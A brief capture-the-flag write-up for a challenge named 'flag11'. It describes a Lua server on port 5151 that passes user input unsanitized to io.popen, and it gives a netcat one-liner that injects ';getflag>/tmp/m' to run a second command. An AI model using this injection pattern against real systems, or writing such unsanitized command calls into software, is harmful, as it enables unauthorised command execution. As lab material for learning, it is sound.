# flag11

This is a simple command injection challenge.

A server is served on port `5151` and we have the source code in a lua file.

This server seems to perform some sort of hashing function on user input, but passes it in the `io.popen` function unsanitized, allowing for command execution.

We can pass something like this:
```bash
echo ';getflag>/tmp/m' | nc 127.0.0.1 5151
```

And get the flag:
```bash
$ cat /tmp/m
<flag11>
```
